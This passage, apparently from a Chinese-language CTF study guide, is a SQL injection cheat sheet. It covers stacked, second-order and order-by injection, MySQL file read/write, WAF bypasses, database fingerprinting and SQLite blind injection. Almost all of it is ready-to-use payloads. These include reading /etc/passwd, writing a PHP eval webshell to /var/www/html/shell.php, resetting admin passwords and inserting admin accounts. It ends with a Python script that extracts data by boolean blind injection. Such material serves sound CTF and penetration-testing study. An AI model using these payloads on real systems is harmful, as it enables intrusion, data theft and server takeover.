1%df%27 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) -- 
```

### 12.7 常见注意点

1. 宽字节注入通常和 GBK、GB2312、Big5 这类编码有关，UTF-8 环境下一般不适用。
2. 它主要绕过的是单引号被反斜杠转义的情况。
3. `%df%27` 不是唯一写法，也可以尝试 `%bf%27`、`%a1%27`、`%aa%27`、`%ba%27` 等。
4. `%df%27` 这类 payload 不建议直接写在网页输入框里，应该用 HackBar、BurpSuite 或直接改 URL 参数来发送。
5. 如果用 HackBar 或直接在 URL 参数里传 payload，注意不要让浏览器或工具把 `%df%27` 提前乱解码。

## 13. 堆叠注入

堆叠注入就是通过分号 `;` 结束当前 SQL 语句，然后继续执行后面的 SQL 语句。

正常后端代码可能是：

```sql
select * from users where id = '用户输入';
```

传入：

```sql
1'; select sleep(5) -- 
```

最终 SQL 可能变成：

```sql
select * from users where id = '1'; select sleep(5) -- ';
```

**注意：如果数据库名、表名、列名是纯数字，或者包含特殊字符，需要使用反引号包裹。**

### 13.1 堆叠注入的条件

1. 参数本身存在 SQL 注入。
2. 分号 `;` 没有被过滤。
3. 后端数据库驱动允许一次执行多条 SQL。
4. 当前注入点的闭合方式正确。
5. 当前数据库用户有执行对应语句的权限。

### 13.2 判断是否存在堆叠注入

```sql
1'; select sleep(5) -- 
1'; do sleep(5) -- 
```

### 13.3 直接执行查询语句

```sql
1'; select database() -- 
1'; select user() -- 
1'; select version() -- 
1'; select group_concat(schema_name) from information_schema.schemata -- 
1'; select group_concat(table_name) from information_schema.tables where table_schema=database() -- 
1'; select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x【表名十六进制】 -- 
1'; select group_concat(【列名】) from 【表名】 -- 
```

如果 `select` 被过滤，可以用 `show` 枚举库、表、列：

```sql
1'; show databases -- 
1'; show tables -- 
1'; show tables from 【数据库名】 -- 
1'; show columns from 【数据库名】.【表名】 -- 
1'; desc 【数据库名】.【表名】 -- 
```

### 13.4 修改数据

修改指定字段：

```sql
1'; update 【表名】 set 【列名】='test' where 【条件列】='admin' -- 
```

修改用户密码：

```sql
1'; update 【用户表名】 set 【密码列】='123456' where 【用户名列】='admin' -- 
1'; update 【用户表名】 set 【密码列】=md5('123456') where 【用户名列】='admin' -- 
```

插入新用户：

```sql
1'; insert into 【用户表名】(【用户名列】,【密码列】) values('test','123456') -- 
1'; insert into 【用户表名】(【用户名列】,【密码列】,【权限列】) values('test','123456','admin') -- 
```

### 13.5 改表名配合万能密码

```sql
1'; rename table 【用户表名】 to users_bak -- 
1'; rename table 【Flag表名】 to 【用户表名】 -- 
1'; alter table 【用户表名】 change 【原列名】 【新列名】 varchar(255) -- 
```

后续再用万能密码访问：

```sql
' or 1=1 -- 
```

### 13.6 Handler 句柄法

`handler` 是 MySQL 专属语法，可以不使用 `select` 读取表数据。

```sql
1'; handler 【表名】 open -- 
1'; handler 【表名】 read first -- 
1'; handler 【表名】 read next -- 
1'; handler 【表名】 close -- 
```

按索引读取：

```sql
1'; handler 【表名】 read 【索引名】 first -- 
1'; handler 【表名】 read 【索引名】 next -- 
```

### 13.7 预处理语句

```sql
1'; set @a=concat('sel','ect database()'); prepare stmt from @a; execute stmt; deallocate prepare stmt -- 
```

常见查询写法：

```sql
1'; set @a=concat('sel','ect group_concat(schema_name) from information_schema.schemata'); prepare stmt from @a; execute stmt; deallocate prepare stmt -- 

1'; set @a=concat('sel','ect group_concat(table_name) from information_schema.tables where table_schema=database()'); prepare stmt from @a; execute stmt; deallocate prepare stmt -- 

1'; set @a=concat('sel','ect group_concat(column_name) from information_schema.columns where table_schema=0x【数据库名十六进制】 and table_name=0x【表名十六进制】'); prepare stmt from @a; execute stmt; deallocate prepare stmt -- 

1'; set @a=concat('sel','ect group_concat(【列名】) from 【数据库名】.【表名】'); prepare stmt from @a; execute stmt; deallocate prepare stmt -- 
```

### 13.8 写文件

```sql
1'; select 'test' into outfile '/var/www/html/test.txt' -- 
1'; select '<?php @eval($_POST[1]);?>' into outfile '/var/www/html/shell.php' -- 
1'; set @a=concat('sel','ect ''test'' into outfile ''/var/www/html/test.txt'''); prepare stmt from @a; execute stmt; deallocate prepare stmt -- 
```

### 13.9 创建表保存结果

```sql
1'; create table 【新表名】(data text) -- 
1'; insert into 【新表名】(data) select 【列名】 from 【表名】 -- 
1'; insert into 【新表名】(data) select 【列名】 from 【数据库名】.【表名】 -- 
```

### 13.10 常见注意点

1. 堆叠注入的关键是分号 `;`。
2. 普通注入能用，不代表堆叠注入一定能用。
3. MySQL 支持多语句，但后端驱动不一定允许多语句执行。
4. 第二条 `select` 即使执行，也不一定有回显。
5. 如果 `select` 被严格过滤，可以优先考虑堆叠注入里的 `show`、Handler 句柄法、改表名、预处理语句。
6. 堆叠注入不只用于查询，更常用于修改数据或改变表结构。
7. 如果当前库里没找到 flag，要记得查所有数据库名。
8. 如果分号被过滤，堆叠注入通常就很难继续使用。

## 14. 二次注入

二次注入就是 payload 第一次提交时没有立即执行，而是先被存进数据库，后面又被程序取出来拼接进新的 SQL 语句里，才触发注入。

### 14.1 二次注入的条件

1. 用户输入会被存进数据库。
2. 存进去的内容保留了 SQL 特殊字符，比如单引号。
3. 后端后续会把这段内容取出来。
4. 取出来之后又直接拼接进新的 SQL 语句。
5. 后续触发点的 SQL 没有使用预编译或安全过滤。

### 14.2 常见触发位置

常见存储点：用户名、昵称、邮箱、地址、个性签名、留言、评论、文章标题、搜索记录、访问日志、User-Agent。

常见触发点：登录、查看个人资料、修改密码、修改资料、后台审核、搜索历史、数据导出。

### 14.3 判断是否存在二次注入

先在可存储的位置写入特殊字符：

```sql
test'
```

然后访问可能触发的位置。如果第二次访问时报 SQL 语法错误，说明存在二次注入。

也可以写入延时 payload：

```sql
test' and sleep(5) -- 
```

### 14.4 修改密码场景

后端代码可能类似：

```sql
update users set password='$newpass' where username='$username';
```

注册用户名时写入 `admin' -- `，登录后再使用修改密码功能：

```sql
update users set password='123456' where username='admin' -- ';
```

如果后端还校验旧密码：

```sql
update users set password='123456' where username='admin' -- ' and password='$oldpass';
```

### 14.5 查看资料场景

```sql
test' union select 1,2,3 -- 
test' union select 1,database(),3 -- 
test' union select 1,group_concat(schema_name),3 from information_schema.schemata -- 
test' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() -- 
test' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x【表名十六进制】 -- 
test' union select 1,group_concat(【列名】),3 from 【表名】 -- 
```

### 14.6 报错二次注入

```sql
test' and updatexml(1,concat(0x7e,database(),0x7e),1) -- 
test' and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1) -- 
test' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) -- 
test' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x【表名十六进制】),0x7e),1) -- 
test' and updatexml(1,concat(0x7e,(select group_concat(【列名】) from 【表名】),0x7e),1) -- 
```

### 14.7 时间二次注入

```sql
test' and sleep(5) -- 
test' and if(length(database())=【长度】,sleep(5),1) -- 
test' and if(ascii(substr(database(),【位置】,1))=【ASCII码】,sleep(5),1) -- 
test' and if(ascii(substr((select group_concat(【列名】) from 【表名】),【位置】,1))=【ASCII码】,sleep(5),1) -- 
```

### 14.8 存储时被转义的情况

有些题目第一次写入数据库时，后端会对单引号进行转义。例如用户输入 `test'`，插入数据库时可能变成 `insert into users(username) values('test\'');`。但是数据库里真正保存的内容可能仍然是 `test'`。后续如果程序把这个值取出来再直接拼接 SQL，单引号就会重新发挥作用。

### 14.9 常见注意点

1. 二次注入不是第一次提交时立即执行，而是后续再次使用数据时执行。
2. 判断二次注入时，要同时找存储点和触发点。
3. 第一次提交没有报错，不代表不存在 SQL 注入。
4. 如果触发点有回显，考虑 Union 二次注入。
5. 如果触发点有报错，考虑报错二次注入。
6. 如果触发点没有回显，考虑时间二次注入。
7. 二次注入的核心是"先存储，后触发"。

## 15. Insert / Update / Delete 注入

### 15.1 Insert 注入

Insert 注入发生在 INSERT 语句中，用户输入被直接拼接到插入的值中。

后端可能写成：

```sql
insert into users(username, password) values('用户输入', 'password');
```

利用子查询读取数据：

```sql
insert into users(username) values((select group_concat(table_name) from information_schema.tables where table_schema=database()));
```

### 15.2 Update 注入

Update 注入发生在 UPDATE 语句中。

后端可能写成：

```sql
update users set email='用户输入' where username='admin';
```

利用报错注入读取数据：

```sql
1 and updatexml(1,concat(0x7e,database(),0x7e),1) where id=1
```

### 15.3 Delete 注入

Delete 注入发生在 DELETE 语句中。

```sql
delete from users where id = 用户输入;
```

延时判断：

```sql
1 and if(1=1,sleep(5),0)
```

时间盲注：

```sql
1 and if(ascii(substr(database(),1,1))>0,sleep(5),0)
```

### 15.4 常见注意点

1. Insert/Update/Delete 注入通常没有直接的回显，主要靠报错注入或时间盲注。
2. 可以结合子查询读取数据写入到可查看的字段中。
3. 注意语句的闭合方式，与 SELECT 注入类似。

## 16. Order By 注入

Order By 注入发生在 ORDER BY 子句中，通常位于 SQL 语句末尾。

后端可能写成：

```sql
select * from users order by 用户输入;
```

### 16.1 判断列数

```sql
order by 1
order by 2
order by 3
```

### 16.2 利用报错

```sql
order by 1 and updatexml(1,concat(0x7e,database(),0x7e),1)
```

### 16.3 利用时间盲注

```sql
order by if(1=1,sleep(5),0)
```

MySQL 中可以用条件语句：

```sql
order by if(ascii(substr(database(),1,1))>0,sleep(5),0)
```

### 16.4 常见注意点

1. Order By 后面不能直接跟 UNION，通常只能利用报错或盲注。
2. Order By 后面可以使用函数和子查询。
3. 注意 Order By 的闭合方式。

## 17. 文件读写（MySQL）

文件读写主要是利用 MySQL 的文件相关能力读取服务器文件，或者把内容写到服务器文件里。

| 写法 | 作用 |
| --- | --- |
| `load_file()` | 读取服务器上的文件 |
| `into outfile` | 把查询结果写入文件 |
| `into dumpfile` | 把查询结果原样写入文件 |

### 17.1 读取文件的条件

1. 当前数据库用户有 `FILE` 权限。
2. 目标文件在数据库服务器本机上。
3. MySQL 进程对目标文件有读取权限。
4. 知道目标文件的绝对路径。
5. `secure_file_priv` 没有限制，或者文件在允许的目录里。

先查相关信息：

```sql
-1' union select 1,user(),@@secure_file_priv -- 
```

`@@secure_file_priv` 常见情况：

| 结果 | 说明 |
| --- | --- |
| `NULL` | 通常表示禁止文件导入导出 |
| 空字符串 | 通常表示没有目录限制 |
| 某个目录 | 只能在这个目录下读写文件 |

### 17.2 读取常见文件

```sql
-1' union select 1,load_file('/etc/passwd'),3 -- 
-1' union select 1,load_file('/flag'),3 -- 
-1' union select 1,load_file('/flag.txt'),3 -- 
-1' union select 1,load_file('/var/www/html/flag.php'),3 -- 
```

读取网站源码：

```sql
-1' union select 1,load_file('/var/www/html/index.php'),3 -- 
-1' union select 1,load_file('/var/www/html/config.php'),3 -- 
```

如果页面把 PHP 代码解析或隐藏了，可以用 `hex()` 看十六进制：

```sql
-1' union select 1,hex(load_file('/var/www/html/index.php')),3 -- 
```

### 17.3 路径被引号过滤时

把路径写成十六进制。例如 `/etc/passwd` 的十六进制是 `0x2f6574632f706173737764`：

```sql
-1' union select 1,load_file(0x2f6574632f706173737764),3 -- 
```

### 17.4 写入文件的条件

1. 当前数据库用户有 `FILE` 权限。
2. 知道网站目录的绝对路径。
3. MySQL 进程对目标目录有写权限。
4. `secure_file_priv` 允许往对应目录写文件。
5. 目标文件不能已经存在。
6. 写入的目录能被 Web 访问。

### 17.5 into outfile 写文件

```sql
-1' union select 1,'test',3 into outfile '/var/www/html/test.txt' -- 
-1' union select 1,'<?php @eval($_POST[1]);?>',3 into outfile '/var/www/html/shell.php' -- 
```

### 17.6 into dumpfile 写文件

```sql
-1' union select 1,'test',3 into dumpfile '/var/www/html/test.txt' -- 
-1' union select 1,'<?php @eval($_POST[1]);?>',3 into dumpfile '/var/www/html/shell.php' -- 
```

### 17.7 数值型文件读写

```sql
-1 union select 1,load_file('/flag'),3 -- 
-1 union select 1,hex(load_file('/var/www/html/index.php')),3 -- 
-1 union select 1,'<?php @eval($_POST[1]);?>',3 into outfile '/var/www/html/shell.php' -- 
```

### 17.8 常见注意点

1. `load_file()` 读取的是数据库服务器上的文件。
2. 读不到文件时，也可能是权限、路径或 `secure_file_priv` 限制。
3. 写文件时目标文件不能已经存在。
4. Linux 路径一般是 `/var/www/html/`，Windows 路径可以用 `C:/xxx/xxx`。
5. 如果没有 Union 回显，可以把 `load_file()` 和报错注入、布尔盲注、时间盲注结合。
6. 如果用 HackBar 或直接在 URL 参数里传 payload，`-- ` 后面的空格可以写成 `--+`，`#` 可以写成 `%23`。

## 18. WAF 绕过

### 18.1 空格过滤绕过

#### 18.1.1 注释符绕过

用 `/**/` 代替普通空格：

```sql
-1'/**/union/**/select/**/1,2,3--%0c
-1'/**/union/**/select/**/1,database(),3--%0c
-1'/**/union/**/select/**/1,group_concat(schema_name),3/**/from/**/information_schema.schemata--%0c
-1'/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=0x【数据库名十六进制】--%0c
-1'/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_schema=0x【数据库名十六进制】/**/and/**/table_name=0x【表名十六进制】--%0c
-1'/**/union/**/select/**/1,group_concat(【列名】),3/**/from/**/【数据库名】.【表名】--%0c
```

MySQL 中 `--` 后面需要空白字符，如果普通空格被过滤，可以尝试：

```sql
--%09
--%0b
--%0c
--%0d
```

`--%0c` 在 CTF 中比较常见。**不建议使用 `--%0a`。**

#### 18.1.2 URL 编码空白字符绕过

| 写法 | 含义 |
| --- | --- |
| `%09` | Tab |
| `%0a` | 换行 |
| `%0b` | 垂直制表符 |
| `%0c` | 换页符 |
| `%0d` | 回车 |
| `%a0` | 不间断空格 |

```sql
-1'%09union%09select%091,2,3--%0c
-1'%09union%09select%091,database(),3--%0c
-1'%09union%09select%091,group_concat(schema_name),3%09from%09information_schema.schemata--%0c
```

#### 18.1.3 小括号绕过

```sql
1'UNION(SELECT(1),(database()),(3))--%0c
1'UNION(SELECT(1),group_concat(schema_name),(3)FROM(information_schema.schemata))--%0c
1'UNION(SELECT(1),group_concat(table_name),(3)FROM(information_schema.tables)WHERE(table_schema=0x【数据库名十六进制】))--%0c
```

### 18.2 关键字过滤绕过

#### 18.2.1 大小写混写

```sql
-1' UnIoN SeLeCt 1,2,3 -- 
-1' UnIoN SeLeCt 1,database(),3 -- 
-1' UnIoN SeLeCt 1,group_concat(schema_name),3 FrOm information_schema.schemata -- 
-1' UnIoN SeLeCt 1,group_concat(table_name),3 FrOm information_schema.tables WhErE table_schema=0x【数据库名十六进制】 -- 
-1' UnIoN SeLeCt 1,group_concat(column_name),3 FrOm information_schema.columns WhErE table_schema=0x【数据库名十六进制】 AnD table_name=0x【表名十六进制】 -- 
-1' UnIoN SeLeCt 1,group_concat(【列名】),3 FrOm 【数据库名】.【表名】 -- 
```

#### 18.2.2 双写关键字

```txt
union    -> uniunionon
select   -> seselectlect
from     -> frfromom
where    -> whwhereere
and      -> anandd
or       -> oorr
order by -> ordorderer bbyy
```

```sql
-1' uniunionon seselectlect 1,2,3 -- 
-1' uniunionon seselectlect 1,database(),3 -- 
-1' uniunionon seselectlect 1,group_concat(schema_name),3 frfromom information_schema.schemata -- 
```

#### 18.2.3 URL 编码关键字

```txt
union  -> %75%6e%69%6f%6e
select -> %73%65%6c%65%63%74
from   -> %66%72%6f%6d
where  -> %77%68%65%72%65
```

```sql
-1' %75%6e%69%6f%6e %73%65%6c%65%63%74 1,2,3 -- 
-1' %75%6e%69%6f%6e %73%65%6c%65%63%74 1,database(),3 -- 
```

#### 18.2.4 MySQL 版本注释

```sql
-1' /*!50000union*/ /*!50000select*/ 1,2,3 -- 
-1' /*!50000union*/ /*!50000select*/ 1,database(),3 -- 
-1' /*!50000union*/ /*!50000select*/ 1,group_concat(schema_name),3 from information_schema.schemata -- 
```

#### 18.2.5 关键字等价替换

```txt
and              -> &&
or               -> ||
=                -> like、regexp、in、between
sleep()          -> benchmark()
substr()         -> substring()、mid()
ascii()          -> ord()
database()       -> schema()
group_concat()   -> json_arrayagg()
order by         -> group by
```

#### 18.2.6 and / or 被过滤

```sql
1' && '1'='1 -- 
1' && '1'='2 -- 
1' || '1'='1 -- 
1' || '1'='2 -- 
-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x【数据库名十六进制】 && table_name=0x【表名十六进制】 -- 
```

#### 18.2.7 等号过滤绕过

```sql
1' and database() like 0x【数据库名十六进制】 -- 
1' and database() in (0x【数据库名十六进制】) -- 
1' and ascii(substr(database(),1,1)) between 【ASCII码】 and 【ASCII码】 -- 
```

#### 18.2.8 函数关键字被过滤

```sql
-1' union select 1,schema(),3 -- 
1' and if(ord(mid(database(),【位置】,1))=【ASCII码】,sleep(5),1) -- 
1' and if(ord(mid(database(),【位置】,1))=【ASCII码】,benchmark(5000000,md5(1)),1) -- 
-1' union select 1,json_arrayagg(table_name),3 from information_schema.tables where table_schema=0x【数据库名十六进制】 -- 
```

#### 18.2.9 order by 被过滤

```sql
1' group by 【列数】 -- 
-1' union select 1,2,3 -- 
-1' union select 1,2,3,4 -- 
```

#### 18.2.10 where 被过滤

```sql
-1' union select 1,group_concat(if(table_schema=0x【数据库名十六进制】,table_name,null)),3 from information_schema.tables -- 
-1' union select 1,group_concat(if(table_schema=0x【数据库名十六进制】 && table_name=0x【表名十六进制】,column_name,null)),3 from information_schema.columns -- 
```

#### 18.2.11 limit 被过滤

```sql
-1' union select 1,group_concat(schema_name),3 from information_schema.schemata -- 
-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x【数据库名十六进制】 -- 
1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x【数据库名十六进制】),【位置】,1))=【ASCII码】,sleep(5),1) -- 
```

#### 18.2.12 information_schema 被过滤

如果可以堆叠注入，用 `show` 枚举：

```sql
1'; show databases -- 
1'; show tables -- 
1'; show tables from 【数据库名】 -- 
1'; show columns from 【数据库名】.【表名】 -- 
1'; desc 【数据库名】.【表名】 -- 
```

可以读 MySQL 系统库：

```sql
-1' union select 1,group_concat(table_name),3 from mysql.innodb_table_stats where database_name=database() -- 
```

#### 18.2.13 select 被严格过滤

使用堆叠注入 + `show`：

```sql
1'; show databases -- 
1'; show tables -- 
1'; show columns from 【数据库名】.【表名】 -- 
```

使用 Handler 句柄法：

```sql
1'; use 【数据库名】 -- 
1'; handler 【表名】 open; handler 【表名】 read first -- 
1'; handler 【表名】 open; handler 【表名】 read next -- 
```

改表名：

```sql
1'; rename table 【用户表名】 to users_bak -- 
1'; rename table 【Flag表名】 to 【用户表名】 -- 
1'; alter table 【用户表名】 change 【原列名】 username varchar(255) -- 
```

预处理语句拆分 select：

```sql
1'; set @a=concat('sel','ect database()'); prepare stmt from @a; execute stmt; deallocate prepare stmt -- 
1'; set @a=concat('sel','ect group_concat(schema_name) from information_schema.schemata'); prepare stmt from @a; execute stmt; deallocate prepare stmt -- 
```

### 18.3 引号过滤绕过

十六进制代替字符串：

```sql
-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x【数据库名十六进制】 -- 
-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x【数据库名十六进制】 and table_name=0x【表名十六进制】 -- 
```

布尔盲注里不用引号判断字符：

```sql
1' and ascii(substr(database(),1,1))=【ASCII码】 -- 
1' and ascii(substr((select group_concat(【列名】) from 【表名】),1,1))>【ASCII码】 -- 
```

报错注入里不用引号：

```sql
1' and updatexml(1,concat(0x7e,database(),0x7e),1) -- 
1' and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1) -- 
```

`concat_ws()` 分隔符不用引号：

```sql
-1' union select 1,group_concat(concat_ws(0x3a,【列名1】,【列名2】)),3 from 【表名】 -- 
```

`load_file()` 路径不用引号：

```sql
-1' union select 1,load_file(0x2f6574632f706173737764),3 -- 
-1' union select 1,load_file(0x2f666c6167),3 -- 
```

URL 编码引号：

```txt
' -> %27
" -> %22
```

### 18.4 逗号过滤绕过

#### 18.4.1 MySQL LIMIT 逗号绕过

```sql
limit 1 offset 0
limit 1 offset 3
```

```sql
-1' union select 1,(select username from users limit 1 offset 3),3 -- 
```

#### 18.4.2 SUBSTRING 参数逗号绕过

```sql
substring(database() from 1 for 1)
1' and ascii(substring(database() from 1 for 1))=【ASCII】 -- 
```

#### 18.4.3 IF() 参数逗号绕过

使用 `case when`：

```sql
1' and case when length(database())=【长度】 then sleep(5) else 0 end -- 
1' and case when ascii(substring(database() from 1 for 1))>【ASCII】 then sleep(5) else 0 end -- 
```

#### 18.4.4 Union 多列逗号绕过

MySQL 中使用派生表 + join：

```sql
-1' union select * from (select 1 as a)x join (select database() as b)y join (select 3 as c)z -- 
```

PostgreSQL 中使用 `cross join`：

```sql
-1' union select * from (select 1 as a)x cross join (select current_database() as b)y cross join (select 3 as c)z -- 
```

#### 18.4.5 不同数据库速查

| 目标位置 | MySQL | PostgreSQL | SQLite | SQL Server |
| --- | --- | --- | --- | --- |
| 分页 | `limit 1 offset 0` | `limit 1 offset 0` | `limit 1 offset 0` | `offset 0 rows fetch next 1 rows only` |
| 截取 | `substring(x from 1 for 1)` | `substring(x from 1 for 1)` | 常用 `substr(x,1,1)` | 常用 `substring(x,1,1)` |
| 字符串拼接 | `concat()`；`||` 依赖 SQL Mode | `||` | `||` | `+` |
| 条件表达式 | `case when` | `case when` | `case when` | `case when` |
| 多列无逗号 | 派生表 `join` | 派生表 `cross join` | 派生表 `cross join` | 派生表 `cross join` |

### 18.5 注释符过滤绕过

#### 18.5.1 换用其他注释符

MySQL 中 `--` 被过滤时尝试 `#`（URL 中写成 `%23`）：

```sql
1' order by 【列数】%23
-1' union select 1,2,3%23
-1' union select 1,database(),3%23
-1' union select 1,group_concat(schema_name),3 from information_schema.schemata%23
```

#### 18.5.2 变形 `--` 后面的空白字符

```sql
--+
--%09
--%0b
--%0c
--%0d
```

**不建议使用 `--%0a`。**

#### 18.5.3 URL 编码注释符

```txt
--  -> %2d%2d
#   -> %23
/*  -> %2f%2a
*/  -> %2a%2f
```

```sql
1' order by 【列数】%2d%2d%0c
-1' union select 1,database(),3%2d%2d%0c
```

#### 18.5.4 单个查询框不用注释符闭合

```sql
1' and '1'='1
1' and '1'='2
-1' union select 1,2,3 where '1'='1
-1' union select 1,database(),3 where '1'='1
-1' union select 1,group_concat(schema_name),3 from information_schema.schemata where '1'='1
```

#### 18.5.5 账号密码两个输入框配合块注释

```txt
账号：admin'/*
密码：*/ and '1'='1

账号：-1' union select 1,2,3,4 where 1=1/*
密码：*/ and '1'='1

账号：-1' union select 1,group_concat(schema_name),3,4 from information_schema.schemata where 1=1/*
密码：*/ and '1'='1
```

## 19. 数据库差异

### 19.1 辨别数据库类型

#### 19.1.1 通过工具和页面指纹初步判断

| 指纹特征 | 常见技术栈 | 常见数据库 |
| --- | --- | --- |
| PHP / ThinkPHP / Laravel / WordPress | PHP | MySQL / MariaDB |
| Java / Spring / Spring Boot | Java | MySQL / PostgreSQL / Oracle / SQL Server |
| Python / Django / Flask | Python | SQLite / PostgreSQL / MySQL |
| Node.js / Express / Koa | Node.js | MongoDB / MySQL / PostgreSQL |
| .NET / ASP.NET / IIS | C# / ASP.NET | SQL Server |
| Ruby on Rails | Ruby | PostgreSQL / SQLite / MySQL |

#### 19.1.2 通过报错信息判断

| 报错特征 | 可能数据库 |
| --- | --- |
| `You have an error in your SQL syntax` | MySQL / MariaDB |
| `SQLite` / `sqlite3` | SQLite |
| `PostgreSQL` / `pg_query()` | PostgreSQL |
| `Microsoft SQL Server` / `ODBC SQL Server Driver` | SQL Server |
| `ORA-` / `Oracle` | Oracle |

#### 19.1.3 通过版本函数判断

```sql
# MySQL / MariaDB
-1' union select 1,version(),3 -- 

# SQLite
-1' union select 1,sqlite_version(),3 -- 

# PostgreSQL
-1' union select 1,version(),3 -- 

# SQL Server
-1' union select 1,@@version,3 -- 
```

#### 19.1.4 通过当前数据库函数判断

```sql
# MySQL
-1' union select 1,database(),3 -- 

# PostgreSQL
-1' union select 1,current_database(),3 -- 

# SQL Server
-1' union select 1,db_name(),3 -- 

# SQLite 没有固定的 database() 概念
```

#### 19.1.5 通过系统表判断

| 数据库 | 常见系统表 |
| --- | --- |
| MySQL / MariaDB | `information_schema.schemata` / `information_schema.tables` / `information_schema.columns` |
| SQLite | `sqlite_master` / `sqlite_schema` |
| PostgreSQL | `pg_catalog.pg_tables` / `information_schema.tables` |
| SQL Server | `sysobjects` / `sys.tables` / `information_schema.tables` |

#### 19.1.6 通过延时函数判断

```sql
# MySQL
1' and sleep(5) -- 

# PostgreSQL
1' and pg_sleep(5) is null -- 

# SQL Server
1'; waitfor delay '0:0:5' -- 

# SQLite 没有原生 sleep()
```

#### 19.1.7 通过字符串拼接判断

```sql
# MySQL
-1' union select 1,concat('a','b'),3 -- 

# SQLite
-1' union select 1,'a'||'b',3 -- 

# PostgreSQL
-1' union select 1,'a'||'b',3 -- 

# SQL Server
-1' union select 1,'a'+'b',3 -- 
```

### 19.2 MySQL

MySQL / MariaDB 是 PHP 类 CTF 题目中最常见的数据库。

#### 19.2.1 MySQL 常见差异

| 作用 | MySQL / MariaDB 写法 |
| --- | --- |
| 查版本 | `version()` / `@@version` |
| 查当前数据库 | `database()` |
| 查连接用户 | `user()` |
| 查权限用户 | `current_user()` |
| 查数据库 | `information_schema.schemata` |
| 查表 | `information_schema.tables` |
| 查列 | `information_schema.columns` |
| 拼接字符串 | `concat()` / `concat_ws()` |
| 拼接多行 | `group_concat()` |
| 截取字符串 | `substr()` / `substring()` / `mid()` |
| 延时 | `sleep()` / `benchmark()` |
| 分页 | `limit 【偏移量】,【数量】` / `limit 【数量】 offset 【偏移量】` |
| 文件读取 | `load_file()` |
| 文件写入 | `into outfile` / `into dumpfile` |

#### 19.2.2 枚举数据库、表和列

```sql
# 所有数据库
-1' union select 1,group_concat(schema_name),3 from information_schema.schemata -- 

# 当前数据库的表
-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() -- 

# 列名
-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='【表名】' -- 

# 数据
-1' union select 1,group_concat(【列名】),3 from 【表名】 -- 

# 多字段拼接
-1' union select 1,group_concat(concat_ws(':',【列名1】,【列名2】)),3 from 【表名】 -- 
```

#### 19.2.3 报错注入的版本差异

老版本 MySQL 和部分 MariaDB 环境中常见：

```sql
updatexml(1,concat(0x7e,database(),0x7e),1)
extractvalue(1,concat(0x7e,database(),0x7e))
```

现代 MySQL 8.x 环境可能直接返回"函数不存在"。

#### 19.2.4 SQL Mode

| SQL Mode | 可能影响 |
| --- | --- |
| `ANSI_QUOTES` | 双引号更接近标识符引号 |
| `NO_BACKSLASH_ESCAPES` | 反斜杠不再按默认方式转义字符串 |
| `PIPES_AS_CONCAT` | `||` 被当成字符串连接，而不是逻辑 OR |

### 19.3 SQLite

#### 19.3.1 SQLite 常见差异

| 作用 | SQLite 写法 |
| --- | --- |
| 查版本 | `sqlite_version()` |
| 查表结构 | `sqlite_master` / `sqlite_schema` |
| 查建表语句 | `sql` 字段 |
| 拼接字符串 | `||` |
| 拼接多行 | `group_concat()` |
| 截取字符串 | `substr()` |
| 字符转编码 | `unicode()` |
| 编码转字符 | `char()` |

SQLite 中没有 `information_schema`，没有 `database()`，没有 `concat()`。

#### 19.3.2 判断 SQLite

```sql
1' union select sqlite_version() -- 
1' and exists(select 1 from sqlite_master) -- 
```

#### 19.3.3 Union 联合查询

```sql
1' order by 1 -- 
1' order by 2 -- 
1' order by 3 -- 

-1' union select 1,2,3 -- 
-1' union select 1,sqlite_version(),3 -- 

# 查询所有表名
-1' union select 1,group_concat(name),3 from sqlite_master where type='table' -- 

# 查询建表语句
-1' union select 1,group_concat(sql),3 from sqlite_master where type='table' -- 
-1' union select 1,sql,3 from sqlite_master where type='table' and name='【表名】' -- 

# 查询字段内容
-1' union select 1,group_concat(【列名】),3 from 【表名】 -- 
-1' union select 1,group_concat(【列名1】 || ':' || 【列名2】),3 from 【表名】 -- 
```

#### 19.3.4 布尔盲注

```sql
1' and length(sqlite_version())=【长度】 -- 
1' and unicode(substr(sqlite_version(),1,1))=【Unicode编码】 -- 
1' and (select count(name) from sqlite_master where type='table')=【数量】 -- 
1' and length((select name from sqlite_master where type='table' limit 0,1))=【长度】 -- 
1' and unicode(substr((select name from sqlite_master where type='table' limit 0,1),1,1))=【Unicode编码】 -- 
1' and length((select sql from sqlite_master where type='table' and name='【表名】'))=【长度】 -- 
1' and length((select group_concat(【列名】) from 【表名】))=【长度】 -- 
```

SQLite 布尔盲注脚本：

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "http://target/"
success_text = "You are in..........."
result = ""

for i in range(1, 100):
    left = 31
    right = 127

    while left < right:
        mid = (left + right) // 2

        # 爆 SQLite 版本
        payload = f"1' and unicode(substr(sqlite_version(),{i},1))>{mid} -- "

        # 爆所有表名
        # payload = f"1' and unicode(substr((select group_concat(name) from sqlite_master where type='table'),{i},1))>{mid} -- "

        # 爆字段内容
        # payload = f"1' and unicode(substr((select group_concat(【列名】) from 【表名】),{i},1))>{mid} -- "

        res = requests.get(url, params={"id": payload}, verify=False)

        if success_text in res.text:
            left = mid + 1
        else:
            right = mid

    if left != 31:
        result += chr(left)
        print(result)
    else:
        break
```

#### 19.3.5 时间盲注

SQLite 没有 MySQL 的 `sleep()`，通过大量计算制造延迟。

```sql
# randomblob()
